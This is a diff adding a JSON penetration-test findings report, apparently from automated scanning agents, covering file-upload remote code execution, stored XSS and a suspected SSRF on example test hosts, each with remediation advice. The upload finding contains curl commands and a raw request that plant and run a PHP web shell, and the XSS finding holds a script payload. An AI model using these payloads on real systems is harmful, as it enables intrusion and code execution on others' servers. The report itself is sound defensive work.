@@ -1,0 +1,61 @@
+{
+  "findings": [
+    {
+      "title": "Unauthenticated remote code execution in file upload handler",
+      "severity": "critical",
+      "cvss_score": 9.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "category": "remote_code_execution",
+      "status": "exploited",
+      "description": "The /upload endpoint writes the client supplied filename to disk without sanitisation, which allows a PHP web shell to be dropped and executed.",
+      "endpoint": "https://app.example.test/upload",
+      "discovered_by_agent": "php",
+      "remediation": "Validate and normalise uploaded filenames, store uploads outside the web root and disable script execution in the upload directory.",
+      "evidence_commands": [
+        "curl -s -F 'file=@shell.php;filename=shell.php' https://app.example.test/upload",
+        "curl -s 'https://app.example.test/uploads/shell.php?cmd=id'"
+      ],
+      "evidence_logs": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+      "evidence_explanation": "A PHP web shell was uploaded and executed with the id command, confirming code execution as www-data.",
+      "cve": "CVE-2026-12345",
+      "mitre_attack_id": "T1190",
+      "mitre_attack_name": "Exploit Public-Facing Application",
+      "iso27001_control": "A.8.26",
+      "node_id": "finding-0001",
+      "plugin_or_component": "upload-handler",
+      "raw_request": "POST /upload HTTP/1.1\nHost: app.example.test\nContent-Type: multipart/form-data; boundary=x\n\n--x\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\n\n<?php system($_GET['cmd']); ?>\n--x--",
+      "raw_response": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"stored\":\"/uploads/shell.php\"}"
+    },
+    {
+      "title": "Stored cross-site scripting in profile display name",
+      "severity": "high",
+      "cvss_score": 8.2,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N",
+      "category": "xss_stored",
+      "status": "confirmed",
+      "description": "The display name is rendered unescaped on the public profile page, so a script payload saved in the field executes for every visitor.",
+      "endpoint": "https://app.example.test/profile/42",
+      "discovered_by_agent": "nodejs",
+      "remediation": "HTML-encode user supplied values on output and add a restrictive Content-Security-Policy.",
+      "evidence_commands": [
+        "curl -s -X POST https://app.example.test/api/profile -d 'name=<svg onload=alert(1)>'"
+      ],
+      "evidence_explanation": "The payload was stored and reflected unescaped in the profile HTML.",
+      "mitre_attack_id": "T1059.007",
+      "mitre_attack_name": "JavaScript",
+      "node_id": "finding-0002"
+    },
+    {
+      "title": "Server-side request forgery in URL preview feature",
+      "severity": "medium",
+      "cvss_score": 6.5,
+      "category": "ssrf",
+      "status": "unconfirmed",
+      "description": "The link preview fetcher follows user supplied URLs, including internal addresses. Reaching the cloud metadata service could not be confirmed.",
+      "endpoint": "https://api.example.test/v1/preview?url=http://example.org",
+      "discovered_by_agent": "nodejs",
+      "remediation": "Resolve and validate the target host against an allow list and block link-local and private address ranges.",
+      "node_id": "finding-0003"
+    }
+  ]
+}
